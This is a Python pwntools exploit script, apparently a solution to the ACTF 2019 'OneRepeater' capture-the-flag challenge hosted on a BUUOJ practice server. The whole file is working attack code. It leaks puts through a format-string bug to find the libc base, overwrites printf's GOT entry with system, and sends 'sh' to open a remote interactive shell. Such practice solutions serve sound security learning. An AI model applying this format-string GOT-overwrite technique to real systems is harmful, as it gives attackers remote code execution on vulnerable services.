# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './ACTF_2019_OneRepeater'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.27-32.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26120'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('3) Exit',num)

puts_got = elf.got["puts"]
printf_got = elf.got["printf"]

#16

cmd(1)
payload =  "aaa%18$s" + p32(puts_got)
sl(payload)
cmd(2)
puts_addr =  l32()
lg("puts",puts_addr)

libc.address = puts_addr - libc.sym["puts"]
system_addr = libc.sym["system"]

payload = fmtstr_payload(16, { printf_got : system_addr } )

cmd(1)
sl(payload)
cmd(2)

cmd(1)
sl("sh\x00")
cmd(2)

p.interactive()

'''
@File    :   ACTF_2019_OneRepeater.py
@Time    :   2021/07/21 22:49:23
@Author  :   Niyah 
'''